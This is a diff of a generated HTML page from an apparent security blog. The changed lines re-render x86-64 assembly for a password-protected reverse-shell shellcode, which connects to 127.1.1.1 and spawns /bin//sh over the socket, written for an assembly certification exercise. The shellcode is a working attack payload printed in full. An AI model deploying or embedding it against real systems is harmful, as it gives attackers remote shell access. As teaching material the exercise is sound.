@@ -115,8 +115,8 @@
                 <a href="../tag/nus.html" >NUS (3)</a> &#124; 
                 <a href="../tag/security.html" >Security (118)</a> &#124; 
                 <a href="../tag/server.html" >Server (26)</a> &#124; 
-                <a href="../tag/untagged.html" >Untagged (19)</a> &#124; 
-                <a href="../archives.html" >Archives (170)</a>
+                <a href="../tag/untagged.html" >Untagged (20)</a> &#124; 
+                <a href="../archives.html" >Archives (171)</a>
         </div>
     </div>
 
@@ -249,114 +249,114 @@
 <span class="normal">105</span>
 <span class="normal">106</span>
 <span class="normal">107</span>
-<span class="normal">108</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="k">global</span><span class="w"> </span><span class="nv">_start</span><span class="w"></span>
+<span class="normal">108</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="k">global</span><span class="w"> </span><span class="nv">_start</span>
 
-<span class="k">section</span><span class="w"> </span><span class="nv">.text</span><span class="w"></span>
+<span class="k">section</span><span class="w"> </span><span class="nv">.text</span>
 
-<span class="nl">_start:</span><span class="w"></span>
+<span class="nl">_start:</span>
 
-<span class="w">    </span><span class="nf">jmp</span><span class="w"> </span><span class="kc">$</span><span class="o">+</span><span class="mi">10</span><span class="w"></span>
-<span class="w">    </span><span class="nl">rev_data_struct:</span><span class="w"> </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x02</span><span class="p">,</span><span class="w"> </span><span class="mh">0x01</span><span class="p">,</span><span class="w"> </span><span class="mh">0x11</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x01</span><span class="p">,</span><span class="w"> </span><span class="mh">0x01</span><span class="p">,</span><span class="w"> </span><span class="mh">0x01</span><span class="w"></span>
-
-
-<span class="nl">shell:</span><span class="w"></span>
-
-<span class="w">    </span><span class="c1">; store data struct address in r8</span><span class="w"></span>
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r8</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">rel</span><span class="w"> </span><span class="nv">rev_data_struct</span><span class="p">]</span><span class="w"></span>
-
-<span class="w">    </span><span class="c1">; sock = socket(AF_INET, SOCK_STREAM, 0)</span><span class="w"></span>
-<span class="w">    </span><span class="c1">; AF_INET = 2</span><span class="w"></span>
-<span class="w">    </span><span class="c1">; SOCK_STREAM = 1</span><span class="w"></span>
-<span class="w">    </span><span class="c1">; syscall number 41</span><span class="w"></span>
-
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="nb">rax</span><span class="w"></span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">al</span><span class="p">,</span><span class="w"> </span><span class="mi">41</span><span class="w"></span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">rdi</span><span class="w"></span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nv">dil</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="w"></span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsi</span><span class="w"></span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nv">sil</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"></span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w"></span>
-<span class="w">    </span><span class="nf">syscall</span><span class="w"></span>
-
-<span class="w">    </span><span class="c1">; copy socket descriptor to rdi for future use</span><span class="w"></span>
-
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">rax</span><span class="w"></span>
+<span class="w">    </span><span class="nf">jmp</span><span class="w"> </span><span class="kc">$</span><span class="o">+</span><span class="mi">10</span>
+<span class="w">    </span><span class="nl">rev_data_struct:</span><span class="w"> </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x02</span><span class="p">,</span><span class="w"> </span><span class="mh">0x01</span><span class="p">,</span><span class="w"> </span><span class="mh">0x11</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x01</span><span class="p">,</span><span class="w"> </span><span class="mh">0x01</span><span class="p">,</span><span class="w"> </span><span class="mh">0x01</span>
 
 
-<span class="w">    </span><span class="c1">; server.sin_family = AF_INET </span><span class="w"></span>
-<span class="w">    </span><span class="c1">; server.sin_port = htons(PORT)</span><span class="w"></span>
-<span class="w">    </span><span class="c1">; server.sin_addr.s_addr = inet_addr(&quot;127.1.1.1&quot;)</span><span class="w"></span>
-<span class="w">    </span><span class="c1">; bzero(&amp;server.sin_zero, 8)</span><span class="w"></span>
-<span class="w">    </span><span class="c1">; remove 0x1 by subtracting</span><span class="w"></span>
+<span class="nl">shell:</span>
 
-<span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="p">[</span><span class="nb">r8</span><span class="o">+</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="mh">0x1</span><span class="w"></span>
+<span class="w">    </span><span class="c1">; store data struct address in r8</span>
+<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r8</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">rev_data_struct</span><span class="p">]</span>
 
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">al</span><span class="p">,</span><span class="w"> </span><span class="mi">42</span><span class="w"></span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r8</span><span class="w"></span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">dl</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="w"></span>
-<span class="w">    </span><span class="nf">syscall</span><span class="w"></span>
+<span class="w">    </span><span class="c1">; sock = socket(AF_INET, SOCK_STREAM, 0)</span>
+<span class="w">    </span><span class="c1">; AF_INET = 2</span>
+<span class="w">    </span><span class="c1">; SOCK_STREAM = 1</span>
+<span class="w">    </span><span class="c1">; syscall number 41</span>
 
+<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="nb">rax</span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">al</span><span class="p">,</span><span class="w"> </span><span class="mi">41</span>
+<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">rdi</span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nv">dil</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span>
+<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsi</span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nv">sil</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span>
+<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span>
+<span class="w">    </span><span class="nf">syscall</span>
 
-<span class="w">    </span><span class="c1">; duplicate sockets</span><span class="w"></span>
+<span class="w">    </span><span class="c1">; copy socket descriptor to rdi for future use</span>
 
-<span class="w">    </span><span class="c1">; STDIN</span><span class="w"></span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">al</span><span class="p">,</span><span class="w"> </span><span class="mi">33</span><span class="w"></span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsi</span><span class="w"></span>
-<span class="w">    </span><span class="nf">syscall</span><span class="w"></span>
-
-<span class="w">    </span><span class="c1">; STDOUT</span><span class="w"></span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">al</span><span class="p">,</span><span class="w"> </span><span class="mi">33</span><span class="w"></span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nv">sil</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"></span>
-<span class="w">    </span><span class="nf">syscall</span><span class="w"></span>
-
-<span class="w">    </span><span class="c1">; STDERR</span><span class="w"></span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">al</span><span class="p">,</span><span class="w"> </span><span class="mi">33</span><span class="w"></span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nv">sil</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="w"></span>
-<span class="w">    </span><span class="nf">syscall</span><span class="w"></span>
-
-<span class="w">    </span><span class="c1">;read password and store in first byte of r8</span><span class="w"></span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="nb">rax</span><span class="w"></span>
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">r8</span><span class="p">]</span><span class="w"></span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">dl</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"></span>
-<span class="w">    </span><span class="nf">syscall</span><span class="w"></span>
-
-<span class="w">    </span><span class="c1">; check password against expected password | , if fail jump out of bounds, should cause a segfault</span><span class="w"></span>
-<span class="w">    </span><span class="nf">cmp</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="p">[</span><span class="nb">rsi</span><span class="p">],</span><span class="w"> </span><span class="mh">0x7C</span><span class="w"></span>
-<span class="w">    </span><span class="nf">jnz</span><span class="w"> </span><span class="kc">$</span><span class="o">+</span><span class="mi">44</span><span class="w"></span>
-
-<span class="w">    </span><span class="c1">; execve</span><span class="w"></span>
-
-<span class="w">    </span><span class="c1">; First NULL push</span><span class="w"></span>
-
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="nb">rax</span><span class="w"></span>
-<span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">rax</span><span class="w"></span>
-
-<span class="w">    </span><span class="c1">; push /bin//sh in reverse</span><span class="w"></span>
-
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rbx</span><span class="p">,</span><span class="w"> </span><span class="mh">0x68732f2f6e69622f</span><span class="w"></span>
-<span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">rbx</span><span class="w"></span>
-
-<span class="w">    </span><span class="c1">; store /bin//sh address in RDI</span><span class="w"></span>
-
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span><span class="w"></span>
-
-<span class="w">    </span><span class="c1">; Second NULL push</span><span class="w"></span>
-<span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">rax</span><span class="w"></span>
-
-<span class="w">    </span><span class="c1">; set RDX</span><span class="w"></span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span><span class="w"></span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">rax</span>
 
 
-<span class="w">    </span><span class="c1">; Push address of /bin//sh</span><span class="w"></span>
-<span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">rdi</span><span class="w"></span>
+<span class="w">    </span><span class="c1">; server.sin_family = AF_INET </span>
+<span class="w">    </span><span class="c1">; server.sin_port = htons(PORT)</span>
+<span class="w">    </span><span class="c1">; server.sin_addr.s_addr = inet_addr(&quot;127.1.1.1&quot;)</span>
+<span class="w">    </span><span class="c1">; bzero(&amp;server.sin_zero, 8)</span>
+<span class="w">    </span><span class="c1">; remove 0x1 by subtracting</span>
 
-<span class="w">    </span><span class="c1">; set RSI</span><span class="w"></span>
+<span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="p">[</span><span class="nb">r8</span><span class="o">+</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="mh">0x1</span>
 
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span><span class="w"></span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">al</span><span class="p">,</span><span class="w"> </span><span class="mi">42</span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r8</span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">dl</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span>
+<span class="w">    </span><span class="nf">syscall</span>
 
-<span class="w">    </span><span class="c1">; Call the Execve syscall</span><span class="w"></span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">al</span><span class="p">,</span><span class="w"> </span><span class="mi">59</span><span class="w"></span>
-<span class="w">    </span><span class="nf">syscall</span><span class="w"></span>
+
+<span class="w">    </span><span class="c1">; duplicate sockets</span>
+
+<span class="w">    </span><span class="c1">; STDIN</span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">al</span><span class="p">,</span><span class="w"> </span><span class="mi">33</span>
+<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsi</span>
+<span class="w">    </span><span class="nf">syscall</span>
+
+<span class="w">    </span><span class="c1">; STDOUT</span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">al</span><span class="p">,</span><span class="w"> </span><span class="mi">33</span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nv">sil</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span>
+<span class="w">    </span><span class="nf">syscall</span>
+
+<span class="w">    </span><span class="c1">; STDERR</span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">al</span><span class="p">,</span><span class="w"> </span><span class="mi">33</span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nv">sil</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span>
+<span class="w">    </span><span class="nf">syscall</span>
+
+<span class="w">    </span><span class="c1">;read password and store in first byte of r8</span>
+<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="nb">rax</span>
+<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">r8</span><span class="p">]</span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">dl</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span>
+<span class="w">    </span><span class="nf">syscall</span>
+
+<span class="w">    </span><span class="c1">; check password against expected password | , if fail jump out of bounds, should cause a segfault</span>
+<span class="w">    </span><span class="nf">cmp</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="p">[</span><span class="nb">rsi</span><span class="p">],</span><span class="w"> </span><span class="mh">0x7C</span>
+<span class="w">    </span><span class="nf">jnz</span><span class="w"> </span><span class="kc">$</span><span class="o">+</span><span class="mi">44</span>
+
+<span class="w">    </span><span class="c1">; execve</span>
+
+<span class="w">    </span><span class="c1">; First NULL push</span>
+
+<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="nb">rax</span>
+<span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">rax</span>
+
+<span class="w">    </span><span class="c1">; push /bin//sh in reverse</span>
+
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rbx</span><span class="p">,</span><span class="w"> </span><span class="mh">0x68732f2f6e69622f</span>
+<span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">rbx</span>
+
+<span class="w">    </span><span class="c1">; store /bin//sh address in RDI</span>
+
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span>
+
+<span class="w">    </span><span class="c1">; Second NULL push</span>
+<span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">rax</span>
+
+<span class="w">    </span><span class="c1">; set RDX</span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span>
+
+
+<span class="w">    </span><span class="c1">; Push address of /bin//sh</span>
+<span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">rdi</span>
+
+<span class="w">    </span><span class="c1">; set RSI</span>
+
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span>
+
+<span class="w">    </span><span class="c1">; Call the Execve syscall</span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">al</span><span class="p">,</span><span class="w"> </span><span class="mi">59</span>
+<span class="w">    </span><span class="nf">syscall</span>
 </code></pre></div></td></tr></table></div>
 
 <p>This blog post has (not) been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p>
@@ -420,7 +420,7 @@
                     <a href="../feeds/all.atom.xml">Atom Feed</a> | 
                     <a href="../sitemap.xml">Sitemap</a><br />
                     This site uses the <a href="https://github.com/limbenjamin/voce">voce</a> theme by <a href="//limbenjamin.com/">Benjamin Lim</a><br />
-                    Page generated on Sat Jan 14 09:45:02 2023<br />
+                    Page generated on Sun Feb  5 22:12:54 2023<br />
                     &copy; 2012-2023 <a href="..">Benjamin Lim</a> </div>
         </div>
       </div><!-- .site-info -->
